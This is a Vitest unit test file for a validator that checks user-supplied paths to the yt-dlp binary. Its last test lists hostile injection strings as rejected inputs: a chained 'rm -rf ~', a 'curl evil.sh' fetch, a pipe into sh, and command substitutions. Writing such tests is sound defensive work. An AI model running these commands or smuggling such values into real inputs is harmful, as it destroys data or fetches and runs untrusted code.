import { describe, it, expect } from 'vitest';
import { validateBinaryPath } from '../binary-validator';

describe('validateBinaryPath', () => {
  it('treats empty as valid (use PATH)', () => {
    expect(validateBinaryPath('').valid).toBe(true);
    expect(validateBinaryPath('   ').valid).toBe(true);
  });

  it('accepts absolute unix and windows paths', () => {
    expect(validateBinaryPath('/usr/local/bin/yt-dlp').valid).toBe(true);
    expect(validateBinaryPath('C:\\Tools\\yt-dlp.exe').valid).toBe(true);
  });

  it('rejects relative paths', () => {
    const result = validateBinaryPath('bin/yt-dlp');
    expect(result.valid).toBe(false);
    expect(result.error).toContain('absolute');
  });

  it('rejects parent directory segments', () => {
    expect(validateBinaryPath('/usr/../etc/yt-dlp').valid).toBe(false);
  });

  it('rejects shell metacharacters', () => {
    for (const path of [
      '/usr/bin/yt-dlp; rm -rf ~',
      '/usr/bin/yt-dlp && curl evil.sh',
      '/usr/bin/yt-dlp | sh',
      '/usr/bin/$(whoami)/yt-dlp',
      '/usr/bin/yt-dlp`id`',
    ]) {
      const result = validateBinaryPath(path);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    }
  });
});
